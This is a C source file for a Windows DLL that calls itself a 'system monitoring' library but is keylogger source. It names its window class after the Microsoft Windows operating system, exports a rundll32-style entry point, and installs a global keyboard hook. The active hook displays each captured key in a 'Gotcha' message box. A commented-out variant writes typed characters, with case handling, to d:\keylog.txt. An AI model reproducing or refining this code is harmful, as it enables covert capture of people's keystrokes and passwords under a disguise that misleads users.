
// Library for System Monitoring
// Written by Arjun Menon

#include <windows.h>
#include <stdlib.h>
#include <stdio.h>

static char szAppName[] = "Microsoft® Windows® Operating System" ;
int WINAPI StartSystem(HINSTANCE hInstance, 
					   HINSTANCE hPrevInstance, 
					   PSTR szCmdLine, int nCmdShow)
{
     HWND        hwnd ;
     MSG         msg ;
     WNDCLASS    wndclass ;
	 LRESULT CALLBACK WndProc (HWND hwnd, UINT message,
		 WPARAM wParam, LPARAM lParam);

     wndclass.style         = CS_HREDRAW | CS_VREDRAW ;
     wndclass.lpfnWndProc   = WndProc ;
     wndclass.cbClsExtra    = 0 ;
     wndclass.cbWndExtra    = 0 ;
     wndclass.hInstance     = hInstance ;
     wndclass.hIcon         = LoadIcon (NULL, IDI_WINLOGO) ;
     wndclass.hCursor       = LoadCursor (NULL, IDC_ARROW) ;
     wndclass.hbrBackground = (HBRUSH) GetStockObject (WHITE_BRUSH) ;
     wndclass.lpszMenuName  = NULL ;
     wndclass.lpszClassName = szAppName ;
     
     if (!RegisterClass (&wndclass))
          return 0 ;
     
     hwnd = CreateWindow (szAppName, szAppName,
                          WS_OVERLAPPEDWINDOW,
                          CW_USEDEFAULT, CW_USEDEFAULT,
                          CW_USEDEFAULT, CW_USEDEFAULT,
                          NULL, NULL, hInstance, NULL) ;

	 ShowWindow(hwnd, nCmdShow);

     while (GetMessage (&msg, NULL, 0, 0))
     {
          TranslateMessage (&msg) ;
          DispatchMessage (&msg) ;
     }

     return msg.wParam ;
}

void StartSensing();

LRESULT CALLBACK WndProc (HWND hwnd, UINT message,
						  WPARAM wParam,LPARAM lParam)
{
	switch (message)
	{
	case WM_CREATE:
		StartSensing();
		break;
	case WM_CLOSE:
		DestroyWindow(hwnd);
		break;
	case WM_DESTROY:
		PostQuitMessage (0) ;
		return 0 ;
	}
	return DefWindowProc (hwnd, message, wParam, lParam) ;
}

HANDLE hDLL = NULL;

int WINAPI DllMain(HANDLE hModule,
				   DWORD ul_reason_for_call,
				   LPVOID lpReserved)
{
	hDLL = hModule;

	return TRUE;
}

__declspec(dllexport) void ActivateSystem
(HWND hwnd, HINSTANCE hinst, LPSTR lpszCmdLine, int nCmdShow)
{
	StartSystem((HINSTANCE)hDLL, NULL, "", SW_NORMAL);
}

HANDLE hFile;
DWORD nFile;

void StartSensing()
{
	hFile = CreateFile("d:\\log.txt",
                GENERIC_WRITE,
                FILE_SHARE_READ,           
                NULL,                      
                CREATE_ALWAYS,             
                FILE_ATTRIBUTE_NORMAL,     
                NULL);
	//WriteFile(hFile,"Arjun",5,&nFile,NULL);

	HHOOK KeylogHook = NULL;
	LRESULT CALLBACK KeyboardHookProc
	(int code, WPARAM wParam, LPARAM lParam);
	KeylogHook = SetWindowsHookEx
	(WH_KEYBOARD,(HOOKPROC)KeyboardHookProc,(HINSTANCE)hDLL,NULL);
}

//#pragma pack(1)
struct KeyDetails
{
	LPARAM repeat   : 16;
	LPARAM scan     :  8;
	LPARAM extended :  1;
	LPARAM reserved :  4;
	LPARAM altkey   :  1;
	LPARAM keydown  :  1;
	LPARAM pressed  :  1;
};

LRESULT CALLBACK KeyboardHookProc
(int code, WPARAM wParam, LPARAM lParam)
{
	struct KeyDetails *kd = NULL;
	kd = (struct KeyDetails *)&lParam;

	if(kd ->keydown == 0)
		MessageBeep(-1);

	char k[100];
	sprintf(k,"%c <- %x = %x\nrepeat = %u\nscan = %u\n\
ext = %u\nres = %u\nalt = %u\nkeydown = %u\npressed = %u\n"
	,wParam,lParam,*kd,kd->repeat,kd->scan,kd->extended,
	kd->reserved,kd->altkey,kd->keydown,kd->pressed);
	MessageBox(0,k,"Gotcha",0);

	return CallNextHookEx(NULL, code, wParam, lParam);
}

/*
#include <fstream.h>

LRESULT CALLBACK KeyboardHookProc( int code, WPARAM key, LPARAM lParam)
{
	bool casematch;
	SHORT ad;

	ofstream out;
	out.open("d:\\keylog.txt",ofstream::out);

	if (code != HC_NOREMOVE)  {
		if (lParam<0) {
			if (((key>45) && (key<91)) || (key==32) )
			{
				char res;
				res=char(key);

				ad=GetKeyState(VK_SHIFT);
 				if (ad < 0)
					casematch= TRUE;
				else
					casematch=FALSE;
				if (casematch==FALSE) 
					strlwr(&res);
				if (casematch==TRUE)
					strupr(&res);
				out<<res;
  			}
		}
	}

   out.close();
   flush(out);  
   
   return CallNextHookEx(NULL, code, key, lParam);
} 
*/